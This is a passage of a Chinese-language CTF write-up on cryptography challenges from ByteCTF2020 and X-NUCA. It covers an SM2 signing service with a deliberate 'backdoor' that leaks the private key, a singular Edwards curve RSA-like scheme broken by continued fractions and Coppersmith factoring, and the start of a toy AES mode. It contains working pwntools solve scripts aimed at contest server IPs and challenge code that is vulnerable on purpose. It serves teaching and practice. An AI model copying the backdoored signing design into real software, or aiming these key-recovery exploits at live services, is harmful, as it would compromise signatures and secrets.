4294966477, 4294966553, 4294966583, 4294966591, 4294966619, 4294966639, 4294966651, 4294966657, 4294966661, 4294966667, 4294966769, 4294966813, 4294966829, 4294966877, 4294966909, 4294966927, 4294966943, 4294966981, 4294966997, 4294967029, 4294967087, 4294967111, 4294967143, 4294967161, 4294967189, 4294967197, 4294967231, 4294967279, 4294967291] for i in range(2**10): sh = remote(\u0026#34;182.92.153.117\u0026#34;, 30101) proof_of_work(sh) length = 32 c = [] index = 0 for i in range(63): tmp = io(sh, primes[index]) if tmp%primes[index] !=0:\t//这个判断是剔除k等于0的情况 c.append(-1 * tmp) index += 1 if index \u0026gt;= 32:\t//如果超过32个数的k不等于0，我们就可以拿来用了，但也不确定是否这32个数都为1 break if index \u0026lt; 32: continue secret = GCRT(primes, c)[0] sh.sendline(\u0026#39;bless\u0026#39;) sh.sendline(str(secret)) tmp = sh.recvuntil(\u0026#39;\\n\u0026#39;) if len(tmp) \u0026lt; 5: tmp = sh.recvuntil(\u0026#39;\\n\u0026#39;) if b\u0026#39;WRONG\u0026#39; in tmp: sh.close() continue print(tmp) sh.interactive() threshold # 需要前置知识或了解：椭圆曲线相关性质\nfrom gmssl import func, sm2 #from flag import FLAG flag=\u0026#34;Congratulations!\u0026#34; sm2p256v1_ecc_table = { \u0026#39;n\u0026#39;: \u0026#39;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123\u0026#39;, \u0026#39;p\u0026#39;: \u0026#39;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF\u0026#39;, \u0026#39;g\u0026#39;: \u0026#39;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7\u0026#39; + \u0026#39;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0\u0026#39;, \u0026#39;a\u0026#39;: \u0026#39;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC\u0026#39;, \u0026#39;b\u0026#39;: \u0026#39;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93\u0026#39;, } n = \u0026#39;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123\u0026#39; G = \u0026#39;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7\u0026#39; \\ \u0026#39;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0\u0026#39; def sign(tsm2): data = func.random_hex(len(n)) k1_str = func.random_hex(len(n)) print(tsm2.send_p1(data, k1_str)) backdoor = input(\u0026#39;backdoor:\u0026#39;).strip() result = tsm2.output_p1(k1_str, backdoor) print(result) def verify(tsm2): message = input(\u0026#39;msg:\u0026#39;).strip().encode().strip(b\u0026#39;\\x00\u0026#39;) sign = input(\u0026#39;sign:\u0026#39;).strip().encode().strip(b\u0026#39;\\x00\u0026#39;) check = tsm2.verify(sign, message) if check is True and message == b\u0026#39;Hello, Welcome to ByteCTF2020!\u0026#39;: print(FLAG) else: print(check) class TSM2(object): def __init__(self, sk): ecc_table = sm2p256v1_ecc_table self.ecc_table = ecc_table self.n = int(ecc_table[\u0026#39;n\u0026#39;], 16) self.para_len = len(ecc_table[\u0026#39;n\u0026#39;]) self.ecc_a3 = (int(ecc_table[\u0026#39;a\u0026#39;], base=16) + 3) % int(ecc_table[\u0026#39;p\u0026#39;], base=16) self.sk = int(sk, 16) self.pk = self._kg(self.sk, ecc_table[\u0026#39;g\u0026#39;]) self.sks = int(func.random_hex(self.para_len), 16) self.pks = pow((self.sk + 1) * self.sks, self.n - 2, self.n) % self.n def send_p1(self, data, k1_str): e = int(data, 16) k1 = int(k1_str, 16) k1 = k1 % self.n R1 = self._kg(k1, self.ecc_table[\u0026#39;g\u0026#39;]) return \u0026#39;%064x%0128s\u0026#39; % (e, R1) def output_p1(self, k1_str, r_s2_s3): r = int(r_s2_s3[0:self.para_len], 16) s2 = int(r_s2_s3[self.para_len:2 * self.para_len], 16) s3 = int(r_s2_s3[2 * self.para_len:], 16) k1 = int(k1_str, 16) d1 = self.sks、 s = (d1 * k1 * s2 + d1 * s3 - r) % self.n if s == 0 or s == (self.n - r): return None return \u0026#39;%064x%064x\u0026#39; % (r, s) def verify(self, Sign, data): r = int(Sign[0:self.para_len], 16) s = int(Sign[self.para_len:2 * self.para_len], 16) e = int(data.hex(), 16) t = (r + s) % self.n if t == 0: return 0 P1 = self._kg(s, self.ecc_table[\u0026#39;g\u0026#39;]) P2 = self._kg(t, self.pk)、 if P1 == P2: P1 = \u0026#39;%s%s\u0026#39; % (P1, 1) P1 = self._double_point(P1) else: P1 = \u0026#39;%s%s\u0026#39; % (P1, 1) P1 = self._add_point(P1, P2) P1 = self._convert_jacb_to_nor(P1) x = int(P1[0:self.para_len], 16) return r == ((e + x) % self.n) def _kg(self, k, Point): if (k % self.n) == 0: return \u0026#39;0\u0026#39; * 128 Point = \u0026#39;%s%s\u0026#39; % (Point, \u0026#39;1\u0026#39;) mask_str = \u0026#39;8\u0026#39; for i in range(self.para_len - 1): mask_str += \u0026#39;0\u0026#39; mask = int(mask_str, 16) Temp = Point flag = False for n in range(self.para_len * 4): if flag: Temp = self._double_point(Temp) if (k \u0026amp; mask) != 0: if flag: Temp = self._add_point(Temp, Point) else: flag = True Temp = Point k = k \u0026lt;\u0026lt; 1 return self._convert_jacb_to_nor(Temp) def _double_point(self, Point): l = len(Point) len_2 = 2 * self.para_len if l \u0026lt; self.para_len * 2: return None else: x1 = int(Point[0:self.para_len], 16) y1 = int(Point[self.para_len:len_2], 16) if l == len_2: z1 = 1 else: z1 = int(Point[len_2:], 16) T6 = (z1 * z1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (y1 * y1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (x1 + T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T4 = (x1 - T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T3 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (y1 * z1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T4 = (T2 * 8) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T5 = (x1 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 * 3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T6 = (T6 * T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T6 = (self.ecc_a3 * T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 + T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) z3 = (T3 + T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (T1 * T1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (T2 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) x3 = (T3 - T5) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) if (T5 % 2) == 1: T4 = (T5 + ((T5 + int(self.ecc_table[\u0026#39;p\u0026#39;], base=16)) \u0026gt;\u0026gt; 1) - T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) else: T4 = (T5 + (T5 \u0026gt;\u0026gt; 1) - T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) y3 = (T1 - T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) form = \u0026#39;%%0%dx\u0026#39; % self.para_len form = form * 3 return form % (x3, y3, z3) def _add_point(self, P1, P2): if P1 == \u0026#39;0\u0026#39; * 128: return \u0026#39;%s%s\u0026#39; % (P2, \u0026#39;1\u0026#39;) if P2 == \u0026#39;0\u0026#39; * 128: return \u0026#39;%s%s\u0026#39; % (P1, \u0026#39;1\u0026#39;) len_2 = 2 * self.para_len l1 = len(P1) l2 = len(P2) if (l1 \u0026lt; len_2) or (l2 \u0026lt; len_2): return None else: X1 = int(P1[0:self.para_len], 16) Y1 = int(P1[self.para_len:len_2], 16) if l1 == len_2: Z1 = 1 else: Z1 = int(P1[len_2:], 16) x2 = int(P2[0:self.para_len], 16) y2 = int(P2[self.para_len:len_2], 16) T1 = (Z1 * Z1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (y2 * Z1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (x2 * T1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 * T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (T3 - X1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (T3 + X1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T4 = (T2 * T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 - Y1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) Z3 = (Z1 * T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (T2 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (T3 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T5 = (T1 * T1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T4 = (X1 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) X3 = (T5 - T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (Y1 * T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (T4 - X3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 * T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) Y3 = (T1 - T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) form = \u0026#39;%%0%dx\u0026#39; % self.para_len form = form * 3 return form % (X3, Y3, Z3) def _convert_jacb_to_nor(self, Point): len_2 = 2 * self.para_len x = int(Point[0:self.para_len], 16) y = int(Point[self.para_len:len_2], 16) z = int(Point[len_2:], 16) z_inv = pow(z, int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) - 2, int(self.ecc_table[\u0026#39;p\u0026#39;], base=16)) z_invSquar = (z_inv * z_inv) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) z_invQube = (z_invSquar * z_inv) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) x_new = (x * z_invSquar) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) y_new = (y * z_invQube) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) z_new = (z * z_inv) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) if z_new == 1: form = \u0026#39;%%0%dx\u0026#39; % self.para_len form = form * 2 return form % (x_new, y_new) else: return None if __name__ == \u0026#39;__main__\u0026#39;: sk = func.random_hex(len(sm2p256v1_ecc_table[\u0026#39;n\u0026#39;])) tsm2 = TSM2(sk) print(\u0026#39;pk:%s\u0026#39; %tsm2.pk) print(\u0026#39;pks:%064x\u0026#39;%tsm2.pks) for i in range(10): op = input(\u0026#39;op: \u0026#39;).strip() if op == \u0026#39;sign\u0026#39;: sign(tsm2) elif op == \u0026#39;verify\u0026#39;: verify(tsm2) else: print(\u0026#34;\u0026#34;\u0026#34;sign: sign message verify: verify message\u0026#34;\u0026#34;\u0026#34;) 啊，这第二题画风就突变，好长的代码，让人失去欲望。但其实呢，大部分都是对sm2的一个实现，其实不用细究。这里我们就直接先提取关键部分，一步一步来啦。\n首先最上面的\ndef sign(tsm2): data = func.random_hex(len(n)) k1_str = func.random_hex(len(n)) print(tsm2.send_p1(data, k1_str)) backdoor = input(\u0026#39;backdoor:\u0026#39;).strip() result = tsm2.output_p1(k1_str, backdoor) print(result) def verify(tsm2): message = input(\u0026#39;msg:\u0026#39;).strip().encode().strip(b\u0026#39;\\x00\u0026#39;) sign = input(\u0026#39;sign:\u0026#39;).strip().encode().strip(b\u0026#39;\\x00\u0026#39;) check = tsm2.verify(sign, message) if check is True and message == b\u0026#39;Hello, Welcome to ByteCTF2020!\u0026#39;: print(FLAG) else: print(check) 俩功能，一个是注册，一个是验证，获取flag的地方就是这个验证，他要求你对message进行一个签名，而message要求是b’Hello, Welcome to ByteCTF2020!’\n好的，那我们看看咋样才能给这个message签上名，去找找签名的验证函数。\ndef verify(self, Sign, data): r = int(Sign[0:self.para_len], 16) s = int(Sign[self.para_len:2 * self.para_len], 16) e = int(data.hex(), 16) t = (r + s) % self.n if t == 0: return 0 P1 = self._kg(s, self.ecc_table[\u0026#39;g\u0026#39;]) P2 = self._kg(t, self.pk) if P1 == P2: P1 = \u0026#39;%s%s\u0026#39; % (P1, 1) P1 = self._double_point(P1) else: P1 = \u0026#39;%s%s\u0026#39; % (P1, 1) P1 = self._add_point(P1, P2) P1 = self._convert_jacb_to_nor(P1) x = int(P1[0:self.para_len], 16) return r == ((e + x) % self.n) 这个验证函数有三个输入：r，s，e，然后这里有一个self._kg ，这个其实就是一个椭圆曲线上的一个乘法，所以P1 = s * g，g是椭圆曲线上的一个基点，P2 = t * pk ，代码前头有对pk的定义 self.pk = self._kg(self.sk, ecc_table['g']),所以就是P2 = ((r+s)%n) * sk * g，接下来的操作不难看出，这里就是两个点相加，这里可以print出来看一下输出，是一个点的坐标的十六进制表示的字符串的拼接，x就是这个点的x坐标。最后是一个判断 r == ((e + x) % self.n)\n首先e是固定的 b’Hello, Welcome to ByteCTF2020!’。我们能操作的就是r和s了，x是一个算出来的坐标，为了让这个判断成立，我们就需要构造我们的输入r，为了构造r得提前算出P1的x坐标，而P1=P1+P2 = s * g + ((r + s)%n) * sk * g。乍一看我们好像陷入了死锁。这里头怎么又出现了r？\n换个思路想想，虽然这里的P1是后来根据我们的输入算出来的，但其实我们也可以先固定这个P1。最后再精心构造一下输入，让他正好算出来是这个P1，\n所以假设我们已经知道最后的点P1了，就当他是2g好了，这样我们就可以算出x了，有了x，那么r也就固定下来了，那我们就就只需要构造s让它算出这个P1点了。\n我们知道，虽然椭圆曲线的加法和乘法不同于普通的四则运算，但是一些运算法则还是适用的，比如分配律、交换律这些，所以式子：P1=P1+P2 = s * g + ((r + s)%n) * sk * g 可以做一些变形，我们已经知道P1=2g了，外加这条曲线的阶是n（我承认我有赌的成分），所以有\n$2*g \\equiv s * g + (r + s) * sk * g \\pmod n$\n$2 \\equiv s + (r+s)* sk \\pmod n$\n$2 \\equiv s*(sk+1) + r *sk \\pmod n$\n$s \\equiv (2 -r*sk) *( sk+1)^{-1} \\pmod n$\n其中r确定了，n确定了，只剩sk了，而sk其实也就是相当于这条椭圆曲线的私钥\n这是我们得回过头来看最初的sign函数了\ndef sign(tsm2): data = func.random_hex(len(n)) k1_str = func.random_hex(len(n)) print(tsm2.send_p1(data, k1_str)) backdoor = input(\u0026#39;backdoor:\u0026#39;).strip() result = tsm2.output_p1(k1_str, backdoor) print(result) 不能再明显了，backdoor都写给你了，显然是要利用这里来整到sk，\ndata和k1_str都是不可控的随机数，\n然后print了send_p1函数的输出，\ndef send_p1(self, data, k1_str): e = int(data, 16) k1 = int(k1_str, 16) k1 = k1 % self.n R1 = self._kg(k1, self.ecc_table[\u0026#39;g\u0026#39;]) return \u0026#39;%064x%0128s\u0026#39; % (e, R1) 给的是data和一个R1，R1是k1 * g，是一个曲线上的点，好像没啥用啊，继续看\n拿到我们的输入后，程序把k1_str和我们的输入传给了output_p1并给了输出\ndef output_p1(self, k1_str, r_s2_s3): r = int(r_s2_s3[0:self.para_len], 16) s2 = int(r_s2_s3[self.para_len:2 * self.para_len], 16) s3 = int(r_s2_s3[2 * self.para_len:], 16) k1 = int(k1_str, 16) d1 = self.sks s = (d1 * k1 * s2 + d1 * s3 - r) % self.n if s == 0 or s == (self.n - r): return None return \u0026#39;%064x%064x\u0026#39; % (r, s) 给的是r和s，只要s不等于0，s+r不等于n，\n其中我们的输入应该是96字节的，分为三段，代表r，s2，s3，\nk1是就是k1_str的整型，程序之前生成的，d1是self.sks，这在代码里头是self.sks = int(func.random_hex(self.para_len), 16)也是一个随机数，但是它和sk跟pks有点关系：self.pks = pow((self.sk + 1) * self.sks, self.n - 2, self.n) % self.n\n之所以扯到pks，因为程序一进去他就把这个值给我们了啊\nif __name__ == \u0026#39;__main__\u0026#39;: sk = func.random_hex(len(sm2p256v1_ecc_table[\u0026#39;n\u0026#39;])) tsm2 = TSM2(sk) print(\u0026#39;pk:%s\u0026#39; %tsm2.pk) print(\u0026#39;pks:%064x\u0026#39;%tsm2.pks) 根据pks的生成式子，其中除了sk和sks我们都知道，\n所以我们应该就是要利用这个pks，sks来恢复这个sk，但是怎么获得这个sks 也即 d1 呢，\ns = (d1 * k1 * s2 + d1 * s3 - r) % self.n 让s2=0，s3=1，r=0，这样就能得到 s = d1 % n了\n显然d1 \u0026lt; n ，故s = d1，并且 d1 + r != n，故能返回。\n那么至此，利用链就全了。\n解题流程 # 所以这道题的整个解题流程：\n构造backdoor = 191 * ‘0’ + ‘1’ 来获取sks， 利用pks来获取sk， 随便在曲线上取一个点，计算x，根据e来固定r 计算$s \\equiv (2 -r*sk) *( sk+1)^{-1} \\pmod n$ 传入r，s，e，获取flag exp\nfrom gmssl import func, sm2 from Crypto.Util.number import * from TSM2 import * sk = func.random_hex(len(sm2p256v1_ecc_table[\u0026#39;n\u0026#39;])) tsm2 = TSM2(sk) from pwn import * context.log_level = \u0026#39;debug\u0026#39; sh=remote(\u0026#34;182.92.215.134\u0026#34;,\u0026#34;30103\u0026#34;) sh.recvuntil(\u0026#34;pk:\u0026#34;) pk =int(sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1],16) sh.recvuntil(\u0026#34;pks:\u0026#34;) pks=int(sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1],16) tsm2.pks=pks sh.recvuntil(\u0026#34;op:\u0026#34;) sh.sendline(\u0026#34;sign\u0026#34;) sh.recvuntil(\u0026#34;backdoor:\u0026#34;) sh.sendline(\u0026#34;0\u0026#34;*191+\u0026#34;1\u0026#34;) sks = int(sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1],16) tsm2.sks=sks tmp = inverse(tsm2.pks,tsm2.n) tsm2.sk=tmp*inverse(tsm2.sks,tsm2.n)%tsm2.n-1 tsm2.pk = tsm2._kg(tsm2.sk, tsm2.ecc_table[\u0026#39;g\u0026#39;]) assert int(tsm2.pk,16)==pk print(tsm2.sk) sh.recvuntil(\u0026#34;op:\u0026#34;) sh.sendline(\u0026#34;verify\u0026#34;) e=bytes_to_long(b\u0026#39;Hello, Welcome to ByteCTF2020!\u0026#39;) b = 2 B = tsm2._kg(b, tsm2.ecc_table[\u0026#39;g\u0026#39;]) x = int(B[0:tsm2.para_len], 16) r = ((e + x) % tsm2.n) #b = s + (s+r)*sk #b = s*(1+sk) + r*sk #b - r*sk n=0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123 print(tsm2.sk,) s = (b - r*tsm2.sk)*inverse(1+tsm2.sk,n)%n sign = \u0026#39;%064x%064x\u0026#39; % (r, s) print(sign) sh.recvuntil(\u0026#34;msg:\u0026#34;) sh.sendline(\u0026#34;Hello, Welcome to ByteCTF2020!\u0026#34;) sh.recvuntil(\u0026#34;sign:\u0026#34;) sh.sendline(sign) sh.interactive() X-NUCA # weird # 需要前置知识或了解：奇异爱德华曲线\n可参考资料：https://learnblockchain.cn/article/1627\n#!/usr/bin/env sage from secret import FLAG assert FLAG.startswith(b\u0026#34;X-NUCA{\u0026#34;) and FLAG.endswith(b\u0026#34;}\u0026#34;) def key_gen(bits): while True: p = random_prime(2**bits) q = random_prime(2**bits) if p % 4 == 3 and q % 4 == 3: break if p \u0026lt; q: p, q = q, p N = p * q while True: x = getrandbits(bits // 2) y = getrandbits(bits // 2) if gcd(x, y) == 1 and (x * y) \u0026lt; (int(sqrt(2 * N)) // 12): e = randint( int(((p + 1) * (q + 1) * 3 * (p + q) - (p - q) * int(N**0.21)) * y / (x * 3 * (p + q))), int(((p + 1) * (q + 1) * 3 * (p + q) + (p - q) * int(N**0.21)) * y / (x * 3 * (p + q))) ) if gcd(e, (p + 1) * (q + 1)) == 1: k = inverse_mod(e, (p + 1) * (q + 1)) break return (N, e, k) if __name__ == \u0026#34;__main__\u0026#34;: bits = 1024 N, e, _ = key_gen(bits) pt = (int.from_bytes(FLAG[:32], \u0026#39;big\u0026#39;), int.from_bytes(FLAG[32:], \u0026#39;big\u0026#39;)) ct = (0, 1) d = (((pt[1])**2 - 1) * inverse_mod(((pt[1])**2 + 1) * (pt[0])**2, N)) % N # 2000 years later...:) for _ in range(e): ct = ( int((ct[0] * pt[1] + ct[1] * pt[0]) * inverse_mod(1 + d * ct[0] * pt[0] * ct[1] * pt[1], N) % N), int((ct[1] * pt[1] + d * ct[0] * pt[0]) * inverse_mod(1 - d * ct[0] * pt[0] * ct[1] * pt[1], N) % N) ) f = open(\u0026#34;output.txt\u0026#34;, \u0026#34;wb\u0026#34;) f.write(str((e, N)).encode() + b\u0026#39;\\n\u0026#39;) f.write(str(ct).encode()) f.close() 好的，第一题代码量不多，不错不错（嗯？似曾相识，危。。）首先看看他的功能，加密方式是把flag拆成了左右两份，组成一个数对，然后做了e次的操作，得到一个ct数对。这里的e次操作其实就是一个奇异爱德华曲线的一个乘法操作。（题目名不就是weird么？）所以有了e作为加密的公钥，我们自然就要找私钥d，而私钥d，（我承认我有赌的成分）d=inverse(e,(p+1) * (q+1))，（曾经在一篇paper里看到过一眼，虽然用的并非奇异爱德华曲线）\nimage-20201102183336623\n其中p，q是大数N的一个分解。这里阶的确定不是很严格，但先试试啦。那么要这么试的话就要分解N，那就要看到这个keygen的过程了，这里p，q的生成有一点点小要求，然后就是这个e的生成，为了生成这个e，还特意整了个x，y。最后要求gcd(e, (p+1) * (q+1))，唉，这，感觉我的猜测是对的好叭。到了这里，，这还不像西湖论剑的那一道题嘛\rWake me until May ends。这道题相关的paper提到\n如果e满足一定的条件，\nimage-20201102184915448\n那么x，y就会在e/N的连分数上，并且通过x和y可以获得T：p+q的一个近似。\nimage-20201102184201011\n那么回到这道题本身，e的取值\ne = randint( int(((p + 1) * (q + 1) * 3 * (p + q) - (p - q) * int(N**0.21)) * y / (x * 3 * (p + q))), int(((p + 1) * (q + 1) * 3 * (p + q) + (p - q) * int(N**0.21)) * y / (x * 3 * (p + q))) ) 即$\\frac{((p+1) * (q+1) * 3 * (p+q)-(p-q) * N^{0.21}) * y}{x * 3 * (p+q)}\u0026lt;e\u0026lt;\\frac{((p+1) * (q+1) * 3 * (p+q)+(p-q) * N^{0.21}) * y}{x * 3 * (p+q)}$\n即$ex-(p+1) * (q+1) * y\u0026lt;\\frac{|(p-q) * N^{0.21}|}{3(p+q)} * y$\n这个范围与paper中给定的$|z|\u0026lt;\\frac{|p-q|}{3(p+q)}N^{\\frac{1}{4}}y$很类似了，就是paper里头是用的$\\phi(N)$，而题目用的是(p+1)(q+1)，但问题不大\n$ex-(p+1) * (q+1) * y = z$\n$ex - y(N + 1 + p + q) = z$\n$\\frac{ex}{y}-N-p-q-1 = \\frac{z}{y}$\n$\\frac{ex}{y}-N-1 - \\frac{z}{y} = p + q$\n算一下$\\frac{z}{y}$即$\\frac{|p-q|}{3(p+q)}N^{0.21}$的大小，约为2048 * 0.21 = 430bit\n现在姑且我们把$T = \\frac{ex}{y}-N-1$看作是p+q，然后计算$\\rho = \\frac{T+\\sqrt{T^2 -4N}}{2}$，$\\rho$作为p的一个近似，其中大约低430bit是不准确的。\n这个时候我们就要用到RSA密码系统中用到过的\rFactoring with high bits known，\nimage-20201102192520897\n显然这里有430bit的不确定位数是满足这个关系的，于是利用这个算法我们最终能成功的分解出p，q来\n然后就能算出这个私钥了。\n有了私钥了，这个曲线怎么算呢？\nd = (((pt[1])**2 - 1) * inverse_mod(((pt[1])**2 + 1) * (pt[0])**2, N)) % N # 2000 years later...:) for _ in range(e): ct = ( int((ct[0] * pt[1] + ct[1] * pt[0]) * inverse_mod(1 + d * ct[0] * pt[0] * ct[1] * pt[1], N) % N), int((ct[1] * pt[1] + d * ct[0] * pt[0]) * inverse_mod(1 - d * ct[0] * pt[0] * ct[1] * pt[1], N) % N) ) 这里有个系数d，首先要计算出这个系数d\n这个系数d的计算要利用到题目给的ct，\n首先看到扭曲爱德华曲线的定义式\nimage-20201102193536643\n针对这一条曲线的加法公式是\nimage-20201102193604325\n针对这一道题他代码里的那个加法式子，我们会发现，这里相当于是扭曲爱德华曲线的系数a = -d\n那么再配上一个坐标(x,y)，我们就能计算出系数d了。\n其实这里可以做一个思考，这个系数d是有啥用？\n我们看到这个源码里这个系数d的生成代码d = (((pt[1])**2 - 1) * inverse_mod(((pt[1])**2 + 1) * (pt[0])**2, N)) % N\n这里pt[0],pt[1]是flag明文前后两段的十进制数表示，所以d是由flag明文决定的。\n我们再变换上述扭曲爱德华曲线的方程：\n$ax^2 + y^2 = 1 + dx^2y^2$\n$dx^2y^2+dx^2=y^2 - 1$\n$d(x^2(y^2+1))=y^2 - 1$\n$d = (y^2-1) * ((y^2+1) * x^2)^{-1}$\n可以发现就是这个生成代码的方程式，pt[1]代表y，pt[0]代表x\n所以其实这个系数d的作用就是保证flag所代表的点在这条曲线上。\n好了，系数d也算出来了，怎么利用私钥来解密呢？\n显然不可能直接利用原来里的这个循环去加上这些点，\n信安数基中就提到过的重复倍加算法了解一下咯~\n解题流程 # 所以这道题的整个解题流程：\n利用连分数得到x，y（至于怎么确定x，y. 可以根据得到的x，y的bit位数，或者用x，y计算出来的T的bit位数来判断） 利用Factoring with high bits known 分解出p，q 计算私钥 prikey = inverse(e , (p+1) * (q+1)) 计算系数$d = (y^2-1) * ((y^2+1) * x^2)^{-1}$ 利用重复倍加算法做一个乘法计算 mt = d * ct exp\ne,N=(,) c = continued_fraction(e/N) for i in range(len(c)): y=c.numerator(i) x=c.denominator(i) if y == 0: continue T = e*x//y-N-1 if 1023\u0026lt;(int(T).bit_length()) \u0026lt; 1026:\t#根据T的bit位数来确定x,y print(T) print(x,int(x).bit_length()) print(y,int(y).bit_length()) break from gmpy2 import *\t#Factoring with high bits known _p = (T+iroot(T^2-4*N,int(2))[0])//2 p = int(_p) n=N kbits = 430 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = x + p x0 = f.small_roots(X=2^kbits, beta=0.4)[0] p = p+x0 print(\u0026#34;p: \u0026#34;, p) assert n % p == 0 q = n/int(p) print(\u0026#34;q: \u0026#34;, q) x,y=(,) #-d*x*^2 +y^2 = 1+d*x^2*y^2 d = (1-y^2)*inverse_mod(-x^2*y^2-x^2,N)%N\t#计算系数d e_inv = inverse_mod(int(e),int((int(p)+1)*(int(q)+1)))\t#计算私钥prikey def add(ct,pt):\t#重复倍加算法的实现 ct = ( int((ct[0] * pt[1] + ct[1] * pt[0]) * inverse_mod(1 + d * ct[0] * pt[0] * ct[1] * pt[1], N) % N), int((ct[1] * pt[1] + d * ct[0] * pt[0]) * inverse_mod(1 - d * ct[0] * pt[0] * ct[1] * pt[1], N) % N) ) return ct def mul_by_double_adding(ct,n): pt = (0, 1) while n \u0026gt; 0: if n % 2 == 1: pt = add(ct, pt) ct = add(ct, ct) n = n\u0026gt;\u0026gt;1 return pt\t(x,y)=mul_by_double_adding((x,y),e_inv)\t#获取mt，得到flag from Crypto.Util.number import long_to_bytes print(long_to_bytes(x)+long_to_bytes(y)) imposter # Toy_AE.py\nimport os from Crypto.Cipher import AES from Crypto.Util.strxor import strxor from Crypto.Util.number import long_to_bytes, bytes_to_long class Toy_AE(): def __init__(self): self.block_size = 16 self.n_size = self.block_size self.delta = b\u0026#39;\\x00\u0026#39; * self.block_size self.init_cipher() def init_cipher(self): key = os.urandom(16) self.cipher = AES.new(key = key, mode = AES.MODE_ECB) def pad(self, m, block_size): return m if len(m) == block_size else (m + b\u0026#39;\\x80\u0026#39; + (b\u0026#39;\\x00\u0026#39; * (block_size - 1 - len(m)))) def GF2_mul(self, a, b, n_size): s = 0 for bit in bin(a)[2:]: s = s \u0026lt;\u0026lt; 1 if bit == \u0026#39;1\u0026#39;: s ^= b upper = bytes_to_long(long_to_bytes(s)[:-n_size]) lower = bytes_to_long(long_to_bytes(s)[-n_size:]) return upper ^ lower def encrypt(self, msg): return self.A_EF(msg) def decrypt(self, ct, _te): msg, te = self.A_DF(ct) return msg if _te == te else None def A_EF(self, msg): self.Sigma = b\u0026#39;\\x00\u0026#39; * self.n_size self.L = self.cipher.encrypt(b\u0026#39;ConvenienceFixed\u0026#39;) self.delta = b\u0026#39;DeltaConvenience\u0026#39; m = len(msg) // self.n_size m += 1 if (len(msg) % self.n_size) else 0 M_list = [msg[i * self.n_size : (i + 1) * self.n_size] for i in range(m)] C_list = [] for i in range(0, (m-1)//2): C1, C2 = self.feistel_enc_2r(M_list[2*i], M_list[2*i +1]) C_list.append(C1) C_list.append(C2) self.Sigma = strxor(M_list[2*i +1], self.Sigma) self.L = long_to_bytes(self.GF2_mul(2, bytes_to_long(self.L), self.n_size)) if m \u0026amp; 1 == 0: Z = self.cipher.encrypt(strxor(self.L, M_list[-2])) Cm = strxor(Z[:len(M_list[-1])], M_list[-1]) Cm_1 = strxor(self.cipher.encrypt(strxor(strxor(self.L, self.delta), self.pad(Cm, self.block_size))), M_list[-2]) self.Sigma = strxor(self.Sigma, strxor(Z, self.pad(Cm, self.block_size))) self.L = strxor(self.L, self.delta) C_list.append(Cm_1) C_list.append(Cm) else: Cm = 